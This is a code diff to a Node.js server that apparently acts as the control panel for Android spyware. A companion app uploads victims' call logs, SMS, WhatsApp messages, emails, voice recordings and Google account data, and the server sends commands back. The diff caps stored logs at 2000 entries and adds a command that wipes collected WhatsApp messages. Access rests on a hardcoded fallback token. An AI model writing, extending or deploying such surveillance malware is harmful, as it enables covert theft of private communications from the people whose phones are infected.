@@ -31,7 +31,6 @@ if (!fs.existsSync(authFile)) {
     }, null, 2));
 }
 
-// ✅ صلاحيات الوصول للأجهزة
 const permsFile = path.join(dataDir, 'device_permissions.json');
 if (!fs.existsSync(permsFile)) {
     fs.writeFileSync(permsFile, JSON.stringify({}, null, 2));
@@ -42,7 +41,7 @@ const SESSION_DURATION = 7 * 24 * 60 * 60 * 1000;
 const activeSessions = new Map();
 
 // ═══════════════════════════════════════════════════════
-// 🔐 APK TOKEN — للتواصل مع التطبيق على الجهاز
+// 🔐 APK TOKEN
 // ═══════════════════════════════════════════════════════
 const APK_TOKEN = process.env.APK_TOKEN || 'SPECTER7';
 
@@ -330,7 +329,7 @@ app.post('/auth/unblock', (req, res) => {
 });
 
 // ═══════════════════════════════════════════════════════
-// 🔐 DEVICE PERMISSIONS (Owner only)
+// 🔐 DEVICE PERMISSIONS
 // ═══════════════════════════════════════════════════════
 
 app.get('/auth/permissions', (req, res) => {
@@ -401,7 +400,6 @@ app.post('/auth/revoke-device', (req, res) => {
 // ═══════════════════════════════════════════════════════
 app.post('/upload.php', (req, res) => {
     try {
-        // ✅ حماية upload — بس APK
         if (!isApkRequest(req)) {
             return res.status(401).json({ error: 'Unauthorized' });
         }
@@ -708,7 +706,8 @@ app.post('/upload.php', (req, res) => {
                     if (!seen.has(key)) { seen.add(key); unique.push(c); }
                 }
                 unique.sort((a, b) => (b.date || 0) - (a.date || 0));
-                existingData.call_logs = unique;
+                // ✅ احتفظ بآخر 2000 مكالمة
+                existingData.call_logs = unique.slice(0, 2000);
             }
 
             if (data.data.sms && data.data.sms.length > 0) {
@@ -721,7 +720,8 @@ app.post('/upload.php', (req, res) => {
                     if (!seen.has(key)) { seen.add(key); unique.push(s); }
                 }
                 unique.sort((a, b) => (b.date || 0) - (a.date || 0));
-                existingData.sms = unique;
+                // ✅ احتفظ بآخر 2000 رسالة
+                existingData.sms = unique.slice(0, 2000);
 
                 data.data.sms.forEach(sms => {
                     pushToDevice(deviceId, 'new_sms', sms);
@@ -750,7 +750,6 @@ app.post('/upload.php', (req, res) => {
 
 app.post('/live_update.php', (req, res) => {
     try {
-        // ✅ حماية — بس APK
         if (!isApkRequest(req)) {
             return res.status(401).json({ error: 'Unauthorized' });
         }
@@ -875,7 +874,6 @@ app.get('/api.php', (req, res) => {
         const deviceId = req.query.device;
         const type = req.query.type;
 
-        // ✅ مسارات مسموحة للـ APK بدون session
         const APK_ALLOWED_GET = ['get_commands', 'check_reset'];
         const apkAuth = isApkRequest(req);
         const apkPath = apkAuth && APK_ALLOWED_GET.includes(action);
@@ -889,7 +887,7 @@ app.get('/api.php', (req, res) => {
             }
 
             if (!session.isOwner) {
-                const ownerOnlyActions = ['delete_device', 'clear_deleted', 'delete_deleted_item', 'delete_whatsapp_chat', 'delete_email', 'delete_voice', 'clear_voices'];
+                const ownerOnlyActions = ['delete_device', 'clear_deleted', 'delete_deleted_item', 'delete_whatsapp_chat', 'delete_email', 'delete_voice', 'clear_voices', 'clear_whatsapp'];
                 if (ownerOnlyActions.includes(action)) {
                     return res.status(403).json({ error: 'Forbidden - Owner only' });
                 }
@@ -960,6 +958,23 @@ app.get('/api.php', (req, res) => {
             const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
             if (fs.existsSync(waFile)) return res.json(JSON.parse(fs.readFileSync(waFile, 'utf8')));
             return res.json([]);
+        }
+
+        // ═══════════════════════════════════════════════════
+        // ✅ NEW: clear_whatsapp — مسح كل رسائل واتساب
+        // ═══════════════════════════════════════════════════
+        if (action === 'clear_whatsapp') {
+            const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
+            if (fs.existsSync(waFile)) {
+                fs.writeFileSync(waFile, '[]');
+                console.log(`[CLEAR] WhatsApp cleared for device=${deviceId}`);
+                return res.json({ success: true });
+            }
+            // لو الملف ما موجود، أنشئه فاضي
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            fs.writeFileSync(waFile, '[]');
+            return res.json({ success: true });
         }
 
         if (action === 'get_google_accounts') {
@@ -1100,7 +1115,6 @@ app.post('/api.php', (req, res) => {
         const { device, command, token } = req.body;
         if (!device || !command) return res.json({ error: 'Device and command required' });
 
-        // ✅ APK يقدر يبعث أوامر (نتائج) بدون session
         const apkAuth = isApkRequest(req);
 
         if (!apkAuth && command !== 'check_reset') {
